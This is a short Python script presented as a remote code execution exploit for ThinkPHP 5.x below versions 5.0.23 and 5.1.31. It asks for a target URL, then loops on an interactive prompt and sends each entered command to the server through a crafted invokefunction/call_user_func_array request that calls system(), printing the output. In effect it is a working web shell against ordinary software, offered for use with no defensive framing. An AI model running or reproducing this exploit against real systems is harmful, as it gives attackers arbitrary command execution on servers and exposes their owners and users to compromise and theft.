#ThinkPHP 5.x < v5.0.23,v5.1.31 Remote Code Execution
#v5.x below v5.0.23,v5.1.31 shell BY-ZYA
import requests


url = input('Your taget name:(e.g.http://magic-mirro.com/thinkphp/public/index.php):')

while (True):

    cmd = input('shellby-zya$')

    exp = "?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=php -r\'system(\""+ cmd+"\");'"

    #print(url + exp)

    r=requests.get(url + exp)
    print(r.text)

